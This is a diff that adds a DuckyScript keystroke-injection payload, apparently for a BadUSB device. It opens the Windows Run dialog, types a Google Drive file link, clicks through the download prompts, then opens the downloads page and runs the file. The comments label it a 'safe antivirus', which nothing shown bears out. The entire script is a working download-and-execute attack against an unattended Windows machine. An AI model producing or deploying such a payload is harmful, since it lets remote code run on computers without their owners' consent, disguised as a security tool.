@@ -1,0 +1,36 @@
+REM downloads safe antivirus
+
+GUI r
+DELAY 200
+STRING https://drive.google.com/file/d/1FAT32ttp2BZPTRg7iBdVk6WHMDg7Sw3p/view?usp=drive_link
+ENTER
+DELAY 3000
+TAB
+ENTER
+DELAY 1000
+TAB
+TAB
+ENTER
+DELAY 1500
+ENTER
+
+
+REM runs the antivirus
+
+DELAY 30000
+CTRL j
+DELAY 1000
+TAB
+TAB
+ENTER
+DELAY 10000
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 1000
+TAB
+ENTER
+DELAY 3000
+ENTER
